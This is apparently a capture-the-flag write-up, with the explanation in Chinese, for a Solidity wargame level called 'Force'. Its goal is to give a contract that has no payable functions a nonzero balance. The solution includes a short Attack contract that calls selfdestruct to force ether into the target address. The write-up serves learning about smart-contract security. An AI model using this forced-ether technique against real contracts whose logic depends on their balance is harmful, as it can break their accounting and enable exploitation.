## 0x01 Task

Some contracts will simply not take your money `¯\_(ツ)_/¯`

The goal of this level is to make the balance of the contract greater than zero.

```javascript
pragma solidity ^0.4.18;

contract Force {/*

                   MEOW ?
         /_/   /
    ____/ o o 
  /~____  =ø= /
 (______)__m_m)

*/}
```

## 0x02 Solution

这里用到智能合约的一个 trick，当一个合约调用 `selfdestruct` 函数，也就是自毁时，可以将所有存款发给另一个合约，并且强制对方收下。
所有只需要再部署一个合约，打一点钱，然后自毁，把剩余金额留给目标合约。

```javascript
pragma solidity ^0.4.18;

contract Attack {
    address instance_address = 0x489457718ffbdc1721938ac411a27a74fa31a85c;

    function Attack() payable{}
    function hack() public {
        selfdestruct(instance_address);
    }
}
```

